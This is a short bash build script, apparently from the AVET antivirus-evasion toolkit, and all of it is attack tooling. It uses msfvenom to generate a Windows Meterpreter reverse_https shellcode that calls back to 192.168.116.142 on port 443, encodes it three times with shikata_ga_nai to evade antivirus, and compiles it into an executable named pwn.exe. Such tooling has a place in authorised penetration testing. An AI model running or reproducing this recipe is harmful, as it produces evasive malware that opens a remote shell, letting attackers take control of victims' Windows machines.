#!/bin/bash          
. build/global_win32.sh
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.142 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
./make_avet -f sc.txt -F
$win32_compiler -o pwn.exe avet.c
rm sc.txt && echo "" > defs.h
